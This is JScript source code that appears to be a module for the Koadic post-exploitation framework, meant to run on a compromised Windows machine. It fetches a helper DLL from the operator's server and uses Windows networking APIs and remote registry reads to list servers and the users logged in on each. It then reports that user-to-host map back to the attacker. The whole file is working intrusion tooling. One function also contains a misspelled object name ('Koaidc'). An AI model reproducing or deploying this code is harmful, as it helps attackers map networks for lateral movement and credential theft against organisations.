function win32_register_via_dynwrapx(manifestPath)
{
    var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );
    actCtx.Manifest = manifestPath;
    var win32 = actCtx.CreateObject("DynamicWrapperX");
    win32.Register("NetApi32.dll", "NetServerEnum", "i=luplppull", "r=l");
    win32.Register("NetApi32.dll", "NetSessionEnum", "i=wluuplppl", "r=l");
    win32.Register("NetApi32.dll", "NetWkstaUserEnum", "i=wlplppl", "r=l");

    return win32;
}

function resolve(hostname)
{
    var results = Koadic.shell.exec("ping -n 1 -4 "+hostname, "~DIRECTORY~\\"+Koaidc.uuid()+".txt");
    return results.split("[")[1].split("]")[0];
}

function read_servers(bufptrptr, entriesread, win32)
{

    var total_servs = win32.NumGet(entriesread);
    var servers = [];

    var bufptr = win32.NumGet(bufptrptr);

    for(var i=0; i<total_servs;i++) {
        var server = win32.StrGet(win32.NumGet(bufptr, 4+8*i));
        servers.push(server);
    }

    return servers;

}

function read_sessions(bufptrptr, entriesread, win32)
{
    var total_sess = win32.NumGet(entriesread);
    var sessions = [];
    if (total_sess == 0) {
        return sessions;
    }

    var bufptr = win32.NumGet(bufptrptr);

    for(var i=0; i<total_sess;i++) {
        var session = {};
        session['cname'] = win32.StrGet(win32.NumGet(bufptr, 16*i)).replace('\\\\', '');
        session['username'] = win32.StrGet(win32.NumGet(bufptr, 4+16*i));
        sessions.push(session);
    }

    return sessions;
}

function read_netwkstauserenum(bufptrptr, entriesread, win32, server)
{
    var total_users = win32.NumGet(entriesread);
    var users = [];
    if (total_users == 0) {
        return users;
    }

    var bufptr = win32.NumGet(bufptrptr);
    for(var i=0; i<total_users;i++) {
        var session = {};
        session['cname'] = server;
        session['username'] = win32.StrGet(win32.NumGet(bufptr, 4*i));
        users.push(session);
    }

    return users;
}

function read_registryusers(server, ip)
{
    try
    {
        var reg = Koadic.registry.provider(server);
    }
    catch (e)
    {
        return [];
    }
    var method = reg.Methods_.Item("EnumKey");
    var inparams = method.InParameters.SpawnInstance_();
    inparams.hDefKey = 0x80000003;
    inparams.sSubKeyName = "";
    var outparams = reg.ExecMethod_(method.Name, inparams);
    var sids = [];
    switch(outparams.ReturnValue)
    {
        case 0:          // Success
            sids = (outparams.sNames != null) ? outparams.sNames.toArray() : [];
            break;

        case 2:        // Not Found
            return sids;
    }

    var users = [];
    var re = /S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$/;
    for(var i in sids)
    {
        if(re.test(sids[i]))
        {
            var session = {};
            session['cname'] = ip;
            var path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\"+sids[i];
            var key = "ProfileImagePath";
            var profile = Koadic.registry.read(Koadic.registry.HKLM, path, key, Koadic.registry.STRING, server).SValue;
            session['username'] = profile.split("\\").pop().split(".")[0];
            users.push(session);
        }
    }

    return users;
}

function net_session_enum(servers, win32)
{
    var bufptrptr;
    var entriesread;
    var totalentries;
    var all_sessions = [];
    for(var i=0;i<servers.length;i++)
    {
        var ip = resolve(servers[i]);
        bufptrptr = win32.MemAlloc(4);
        entriesread = win32.MemAlloc(4);
        totalentries = win32.MemAlloc(4);
        var res = win32.NetSessionEnum(servers[i], 0, 0, 10, bufptrptr, -1, entriesread, totalentries, 0);
        switch (res) {
            case 0:
                all_sessions.push(read_sessions(bufptrptr, entriesread, win32));
                break;
            default:
                //nothing
        }

        win32.MemFree(bufptrptr);
        win32.MemFree(entriesread);
        win32.MemFree(totalentries);

        bufptrptr = win32.MemAlloc(4);
        entriesread = win32.MemAlloc(4);
        totalentries = win32.MemAlloc(4);
        res = win32.NetWkstaUserEnum(servers[i], 0, bufptrptr, -1, entriesread, totalentries, 0);
        switch (res) {
            case 0:
                all_sessions.push(read_netwkstauserenum(bufptrptr, entriesread, win32, ip));
                break;
            default:
                //nothing
        }

        win32.MemFree(bufptrptr);
        win32.MemFree(entriesread);
        win32.MemFree(totalentries);

        // read registry for logged in users
        all_sessions.push(read_registryusers(servers[i], ip));

    }
    return all_sessions;
}

function parse_sessions(sessions)
{
    var merged = [].concat.apply([], sessions);
    var user_session_hash = {};
    for(var i=0;i<merged.length;i++)
    {
        if ( !(merged[i]['username'] in user_session_hash) )
        {
            user_session_hash[merged[i]['username']] = []
        }
        user_session_hash[merged[i]['username']].push(merged[i]['cname']);
    }
    sess_string = "";
    for (var i in user_session_hash)
    {
        sess_string += i+":";
        sess_string += user_session_hash[i].toString();
        sess_string += "***";
    }
    return sess_string;

}

try
{
    var manifestPath = Koadic.file.getPath("~DIRECTORY~\\dynwrapx.manifest");
    Koadic.http.download(manifestPath, "~MANIFESTUUID~");
    Koadic.http.download("~DIRECTORY~\\dynwrapx.dll", "~DLLUUID~");
    var win32 = win32_register_via_dynwrapx(manifestPath);

    var bufptrptr = win32.MemAlloc(4);//if 64bit, 8
    var entriesread = win32.MemAlloc(4);
    var totalentries = win32.MemAlloc(4);
    var servers;
    var res = win32.NetServerEnum(0, 100, bufptrptr, -1, entriesread, totalentries, 0xFFFFFFFF, 0, 0);
    switch (res) {
        case 0:
            // all good
            servers = read_servers(bufptrptr, entriesread, win32);
            break;
        case 5:
            //access denied
            break;
        case 87:
            //The parameter is incorrect.
            break;
        case 234:
            //More entries are available. Specify a large enough buffer to receive all entries.
            break;
        case 6118:
            //No browser servers found.
            break;
        case 50:
            //The request is not supported.
            break;
        case 2127:
            //A remote error occurred with no data returned by the server.
            break;
        case 2114:
            //The server service is not started.
            break;
        case 2184:
            //The service has not been started.
            break;
        case 2138:
            //The Workstation service has not been started. The local workstation service is used to communicate with a downlevel remote server.
            break;
        default:
            //unknown

    }

    win32.MemFree(bufptrptr);
    win32.MemFree(entriesread);
    win32.MemFree(totalentries);

    if (servers)
    {
        var sessions = net_session_enum(servers, win32);
        sessions_string = parse_sessions(sessions);
        var headers = {};
        headers["RESULTS"] = "SESSIONS";
        Koadic.work.report(sessions_string, headers);
        Koadic.work.report("Complete");
    } else {
        //no servers
    }

    //Koadic.work.report("Success");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
